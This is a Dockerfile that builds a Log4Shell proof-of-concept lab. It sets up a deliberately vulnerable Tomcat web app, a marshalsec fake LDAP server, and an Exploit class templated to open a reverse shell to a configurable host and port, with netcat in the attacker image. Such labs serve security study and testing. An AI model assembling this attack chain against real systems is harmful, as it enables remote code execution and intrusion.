# Where the reverse shell should connect to
ARG RSHELL_HOST=log4shell-poc
ARG RSHELL_PORT=9001

# Build the vulnerable application, the ldap server used to exploit it and
# the POC payload.
# Note that we need jdk8 for Exploit.java, as it will be run with jre8.
FROM maven:3.8.6-jdk-8 AS builder
ARG RSHELL_HOST
ARG RSHELL_PORT

# Build the vulnerable application
COPY vulnerable-application /tmp/vulnerable-application
RUN cd /tmp/vulnerable-application && \
    mvn clean package -DskipTests

# Build the fake ldap server
COPY marshalsec /tmp/marshalsec
RUN cd /tmp/marshalsec && \
    mvn clean package -DskipTests

# Build the payload
COPY poc/Exploit.java.tp /tmp/poc/Exploit.java.tp
RUN sed -e "s/<host>/${RSHELL_HOST}/" \
    -e "s/<port>/${RSHELL_PORT}/" \
    /tmp/poc/Exploit.java.tp > /tmp/poc/Exploit.java
RUN cd /tmp/poc && \
    javac Exploit.java

# Build the PoC exploit Docker image
FROM python:3.9.18-bullseye AS poc
ARG DEBIAN_FRONTEND=noninteractive

RUN apt update && \
    apt -y install \
    openjdk-11-jre-headless \
    netcat \
    tmux

COPY --from=builder /tmp/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar \
    /tmp/exploit/marshalsec-0.0.3-SNAPSHOT-all.jar
COPY --from=builder /tmp/poc/Exploit.class \
    /tmp/exploit/Exploit.class
COPY poc/poc.py /tmp/exploit/poc.py
COPY poc/requirements.txt /tmp/exploit/requirements.txt

RUN cd /tmp/exploit/ &&\
    pip install -r requirements.txt

WORKDIR /tmp/exploit
CMD ["sleep", "inf"]

# Build vulnerable Docker image
FROM tomcat:8.0.36-jre8 AS vulnerable

RUN rm -rf /usr/local/tomcat/webapps/*
COPY --from=builder /tmp/vulnerable-application/target/log4shell-1.0-SNAPSHOT.war \
    /usr/local/tomcat/webapps/ROOT.war

EXPOSE 8080
CMD ["catalina.sh", "run"]
